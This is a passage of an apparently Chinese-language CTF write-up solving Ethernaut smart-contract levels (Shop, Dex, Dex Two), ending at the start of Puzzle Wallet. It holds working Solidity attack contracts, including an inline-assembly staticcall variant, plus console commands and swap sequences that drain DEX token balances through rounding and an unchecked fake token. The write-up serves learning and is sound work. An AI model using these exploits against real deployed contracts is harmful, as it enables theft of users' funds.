<p>The following statements are considered modifying the state:</p>
<ol>
<li>Writing to state variables.</li>
<li>Emitting events.</li>
<li>Creating other contracts.</li>
<li>Using selfdestruct.</li>
<li>Sending Ether via calls.</li>
<li>Calling any function not marked view or pure.</li>
<li>Using low-level calls.</li>
<li>Using inline assembly that contains certain opcodes.</li>
</ol>
</blockquote>
<p>本题和前面的<code>Elevator</code>类似，本题合约中有<code>isSold</code>可以用来判断是第一次调用还是第二次调用，只需要第一次调用的时候返回一个大于100的值，第二次返回一个小于100的值即可</p>
<p>exp<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Attack is Buyer &#123;</span><br><span class="line">  Shop s = Shop(0x48866E05E97868945bAD1719E446be951eBcc011);</span><br><span class="line"></span><br><span class="line">  function price() override external view returns (uint)&#123;</span><br><span class="line">    if (!s.isSold())&#123;</span><br><span class="line">      return 200;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      return 50;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function exp() public &#123;</span><br><span class="line">    s.buy();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>做这题的时候是2022.9.22，题目内容有过更新，搜到网上的题解，感觉之前的版本似乎更有意思一点。上一个版本如下，唯一的区别在于限制了gas。使用opcode可以减少gas消耗。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">    uint public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line">        if (_buyer.price.gas(3300)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price.gas(3300)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>exp1</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract Attack is Buyer&#123;</span><br><span class="line">  function price() external view override returns (uint)&#123;</span><br><span class="line">    bool isSold = Shop(msg.sender).isSold();</span><br><span class="line">    assembly &#123;</span><br><span class="line">      let result</span><br><span class="line">      switch isSold</span><br><span class="line">      case 1 &#123;</span><br><span class="line">        result := 50</span><br><span class="line">      &#125;</span><br><span class="line">      default &#123;</span><br><span class="line">        result := 200</span><br><span class="line">      &#125;</span><br><span class="line">      mstore(0x0, result)</span><br><span class="line">      return(0x0, 32)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function exp() public &#123;</span><br><span class="line">    Shop(0xd9145CCE52D386f254917e481eB44e9943F39138).buy();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>exp2</strong>，使用<code>staticcall</code>来调用<code>isSold()</code>从而获取其值，需要六个参数</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xEbP1O"><img src="https://s1.ax1x.com/2022/09/25/xEbP1O.png" alt="xEbP1O.png"></a></p>
<p><strong>Stack input</strong></p>
<ul>
<li><code>gas</code>：发送到要执行的子上下文的gas量。子上下文没有使用gas的会返回到这个上下文</li>
<li><code>address</code>：上下文要执行的账户</li>
<li><code>argsOffset</code>：内存中的字节偏移量，字节为单位，即子上下文的calldata</li>
<li><code>argsSize</code>：要复制的字节大小（calldata的大小）</li>
<li><code>retOffset</code>：内存中的字节偏移量，用来存储子上下文的返回值</li>
<li><code>retSize</code>：要复制的字节大小（返回数据的大小）</li>
</ul>
<p><strong>Stack output</strong></p>
<ul>
<li><code>success</code>：如果子上下文恢复返回0，否则返回1</li>
</ul>
<p>在这里这些参数可以这样设置：</p>
<ul>
<li><code>gas()</code>将剩余的gas发送给被调用者</li>
<li><code>address</code>，因为构造函数<code>constructor(address, shopAddr)</code>，该参数的值已经在状态变量<code>Shop public shop</code>中定义，，可以使用<code>sload</code>来加载。比如<code>sload(0x0)</code>加载slot0存储的值（<code>shop</code>是第一个被定义的状态变量）</li>
<li><code>argsOffset</code>，在被调用者中是<code>msg.data</code>，调用者内存中用来存储参数的起始位置。这里用<code>mstore(0x100, 0xe852e741)</code>，存储函数选择器(function selector)<code>isSold</code>（<code>keccak256(&quot;isSold()&quot;)</code>前四字节）到内存中偏移0x100处（0x100是随便选的）</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(<span class="string">&#x27;isSold()&#x27;</span>).<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="number">0xe852e741</span></span><br></pre></td></tr></table></figure>
<p><code>mstore</code>存储32字节数据，所以起始位置为<code>0x120-0x4=0x11c</code></p>
<ul>
<li><code>argsLength</code>，4，四字节</li>
<li><code>retOffset</code><br><code>success</code>，该参数用于存储来自被调用者的返回值。本例中为当前<code>isSold()</code>的值，将其存储在<code>0x120</code>偏移处（0x120随便选的），这里初始为0</li>
<li><code>retLength</code>，返回数据<code>isSold()</code>是布尔类型由uint256表示，所以保留32字节空间</li>
</ul>
<p><strong>补充</strong></p>
<blockquote>
<p><code>sload(key)</code>，<code>load word from storage</code></p>
<p><code>storage</code>和<code>memory</code>和<code>calldata</code>：</p>
<ul>
<li><code>storage</code>：成员变量，可以跨函数调用。修饰的变量的数据永久存储在区块链上</li>
<li><code>memory</code>：临时数据存储。修饰的变量的数据存储在内存中</li>
<li><code>calldata</code>：一般只有在外部函数（external）的参数被强制指定为calldata，这种数据位置是只读的，不会持久化到区块链中。</li>
</ul>
<p>函数的参数、函数的返回值的默认数据位置是<code>memory</code>，函数内局部变量的默认数据位置为<code>storage</code>。状态变量的默认数据位置是<code>storage</code></p>
</blockquote>
<p>从而有下面攻击合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Attack is Buyer&#123;</span><br><span class="line">  Shop s = Shop(0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47);</span><br><span class="line">  function price() external view override returns (uint)&#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line">      mstore(0x100, 0xe852e741)</span><br><span class="line">      mstore(0x120, 0x0)</span><br><span class="line">      let result := staticcall(gas(), sload(0x0), 0x11c, 0x4, 0x120, 0x20)</span><br><span class="line">      if iszero(mload(0x120))&#123;</span><br><span class="line">        mstore(0x150, 200)</span><br><span class="line">        return(0x150, 0x20)</span><br><span class="line">      &#125;</span><br><span class="line">      mstore(0x150, 50)</span><br><span class="line">      return(0x150, 0x20)</span><br><span class="line">    &#125;      </span><br><span class="line">  &#125;</span><br><span class="line">  function eexp() public &#123;</span><br><span class="line">    s.buy();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1个小插曲"><a href="#1个小插曲" class="headerlink" title="1个小插曲"></a>1个小插曲</h1><p>做到这里的时候突然rinkeby不能再用了，以后改用Goerli了（后来又用Sepolia了，反正哪个能用用哪个），改了测试网络的话之前的记录就没有了，在这里留个图</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/x3vBz6"><img src="https://s1.ax1x.com/2022/10/07/x3vBz6.png" alt="x3vBz6.png"></a></p>
<h1 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;../IERC20.sol&quot;;</span><br><span class="line">import &quot;../ERC20.sol&quot;;</span><br><span class="line">import &quot;../SafeMath.sol&quot;;</span><br><span class="line">import &quot;../Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  using SafeMath for uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public returns(bool)&#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没编译成功，报错：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.sol:7:1: DeclarationError: Identifier already declared.</span><br><span class="line"><span class="section">import &quot;../Ownable.sol&quot;;</span></span><br><span class="line"><span class="section">^----------------------^</span></span><br><span class="line">Context.sol:15:1: The previous declaration is here:</span><br><span class="line">abstract contract Context &#123;</span><br><span class="line">^ (Relevant source part starts here and spans across multiple lines).</span><br></pre></td></tr></table></figure></p>
<p>做题，要求我们把Dex的代币1或代币2清零即可</p>
<p><code>setTokens</code>函数用来给每个代币合约设置地址，该函数只能被owner调用因为修饰符<code>onlyOwner</code></p>
<p><code>addLiquidity</code>函数只能被owner调用，可以给合约提供资金，将从代币地址将允许的代币数量转到Dex</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">  require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">  require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">  uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">  IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>swap</code>函数是一个<code>public</code>函数，没有修饰符，意味着任何人都可以调用该函数。这被用来交换x数量的token1和token2</p>
<ul>
<li>该函数想要<code>from</code>和<code>to</code>地址和一个数量<code>amount</code></li>
<li>函数确保了地址是owner使用<code>setTokens()</code>函数定义的代币地址</li>
<li>另一个<code>require</code>语句检查调用函数的用户是否有足够多的代币</li>
<li>变量<code>swapAmount</code>调用<code>getSwapPrice()</code>函数来计算所有将被交换的数量</li>
<li>调用<code>transferFrom()</code>将从用户转移<code>swapAmount</code>数量的代币到Dex</li>
<li>调用<code>approve</code>来允许代币交换</li>
<li>然后这些<code>to</code>代币从Dex被转移到我们的user</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getSwapPrice</code>函数获取代币的地址和要交换的<code>from</code>代币的数量，并计算<code>to</code>代币的数量，使用下面公式</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="built_in">number</span> <span class="keyword">of</span> token2 <span class="built_in">to</span> be returned = (amount <span class="keyword">of</span> token1 <span class="built_in">to</span> be swapped * token2 balance <span class="keyword">of</span> <span class="keyword">the</span> contract)/token1 balance <span class="keyword">of</span> <span class="keyword">the</span> contract.</span><br></pre></td></tr></table></figure>
<p>此处存在漏洞。在solidity中没有浮点数，也就意味着无论何时函数做除法，结果都是一个分数。因为没有小数和浮点数，代币数量将四舍五入(round off)趋近于零，因此通过从token1到token2之间进行连续的代币交换，就可以将合约中的一个代币的余额减少为0</p>
<p><code>approve</code>是一个<code>ERC20</code>函数，用来授予用钱的人花费<code>amount</code>数量的代币</p>
<p><code>balanceOf()</code>函数只用来计算指定地址的剩余的代币余额</p>
<p>一开始token1和token2均各有10个代币</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), player).<span class="title function_">then</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">toNumber</span>())</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), player).<span class="title function_">then</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">toNumber</span>())</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), instance).<span class="title function_">then</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">toNumber</span>())</span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), instance).<span class="title function_">then</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">toNumber</span>())</span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>
<p>先用<code>approve</code>允许一下转账</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">666</span>)</span><br></pre></td></tr></table></figure>
<p>计算公式是<code>amount*to/from</code>，交换会从把player的<code>from</code>转amount给Dex的<code>from</code>，然后把Dex的<code>to</code>转swapamount给player的<code>to</code>（上面from/to指的是token1/token2，注意后一笔转账用的是换算过的amount）</p>
<p>最后就是来回转钱，转就完事了，其中swapamount算出来的结果精度存在损失，转账的过程中player得到的代币比扣除的代币多，而Dex得到的代币比扣除的代币少，从而player账户的余额会越来越多，而Dex的余额越来越少，最终控制某个值将Dex的某一代币的钱转完即可</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>swap</th>
<th>amount</th>
<th>Dex token1</th>
<th>Dex token2</th>
<th>player token1</th>
<th>player token2</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
</tr>
<tr>
<td>1-&gt;2</td>
<td>10</td>
<td>110</td>
<td>90</td>
<td>0</td>
<td>20</td>
</tr>
<tr>
<td>2-&gt;1</td>
<td>20</td>
<td>86</td>
<td>110</td>
<td>24</td>
<td>0</td>
</tr>
<tr>
<td>1-&gt;2</td>
<td>24</td>
<td>110</td>
<td>80</td>
<td>0</td>
<td>30</td>
</tr>
<tr>
<td>2-&gt;1</td>
<td>30</td>
<td>69</td>
<td>110</td>
<td>41</td>
<td>0</td>
</tr>
<tr>
<td>1-&gt;2</td>
<td>41</td>
<td>110</td>
<td>45</td>
<td>0</td>
<td>65</td>
</tr>
<tr>
<td>2-&gt;1</td>
<td>45</td>
<td>0</td>
<td>90</td>
<td>110</td>
<td>20</td>
</tr>
</tbody>
</table>
</div>
<p>。。。然而算一下发现貌似就算精度不损失这么个转账的方式也会导致player的钱越来越多？最后能够超过Dex的余额达成目标……不好说了……（所以这题只需要无脑转账就完事了）</p>
<p>下面是精度无损情况下的变换过程</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>swap</th>
<th>amount</th>
<th>Dex token1</th>
<th>Dex token2</th>
<th>player token1</th>
<th>player token2</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
</tr>
<tr>
<td>1-&gt;2</td>
<td>10</td>
<td>110</td>
<td>90</td>
<td>0</td>
<td>20</td>
</tr>
<tr>
<td>2-&gt;1</td>
<td>20</td>
<td>110-220/9</td>
<td>110</td>
<td>220/9</td>
<td>0</td>
</tr>
<tr>
<td>1-&gt;2</td>
<td>220/9</td>
<td>110</td>
<td>110-220/7</td>
<td>0</td>
<td>220/7</td>
</tr>
<tr>
<td>2-&gt;1</td>
<td>220/7</td>
<td>110-220/5</td>
<td>110</td>
<td>220/5</td>
<td>0</td>
</tr>
<tr>
<td>1-&gt;2</td>
<td>220/5</td>
<td>110</td>
<td>110-220/3</td>
<td>0</td>
<td>220/3</td>
</tr>
<tr>
<td>2-&gt;1</td>
<td>110/3</td>
<td>0</td>
<td>110</td>
<td>110</td>
<td>110/3</td>
</tr>
</tbody>
</table>
</div>
<h1 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;../IERC20.sol&quot;;</span><br><span class="line">import &quot;../ERC20.sol&quot;;</span><br><span class="line">import &#x27;../SafeMath.sol&#x27;;</span><br><span class="line">import &#x27;../Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  using SafeMath for uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public returns(bool)&#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求我们把Dex Two合约的代币1和代币2全部耗尽</p>
<p>注意到修改的地方在<code>swap</code>方法，注意到少了一条<code>require</code>语句，即不再验证<code>from</code>和<code>to</code>是否是题目合约中的代币地址</p>
<p>即我们可以使用自己的代币进行转账，从而耗尽题目中的代币</p>
<p>首先部署使用ERC20代币标准在remix上部署一个自己的代币，初始设置400代币并给player</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Mytoken is ERC20 &#123;</span><br><span class="line">  constructor(uint256 initialSupply) public ERC20(&quot;Mytoken&quot;, &quot;MYT&quot;) &#123;</span><br><span class="line">    _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用ERC20提供的<code>transfer</code>给DexTwo转账100Mytoken</p>
<p>接着先用<code>approve</code>方法允许一下总额300的代币转，账然后再通过swap交换即可耗尽DexTwo中的代币，过程如下（<code>swapamount</code>计算中使用的是上一个状态下各账户代币的余额）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>swap</th>
<th>amount</th>
<th>DexTwo token1</th>
<th>DexTwo token2</th>
<th>DexTwo Mytoken</th>
<th>player token1</th>
<th>player token2</th>
<th>player Mytoken</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>100</td>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
<td>300</td>
</tr>
<tr>
<td>My-&gt;1</td>
<td>100</td>
<td>0</td>
<td>100</td>
<td>200</td>
<td>110</td>
<td>10</td>
<td>200</td>
</tr>
<tr>
<td>My-&gt;2</td>
<td>200</td>
<td>0</td>
<td>0</td>
<td>400</td>
<td>110</td>
<td>110</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<h1 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 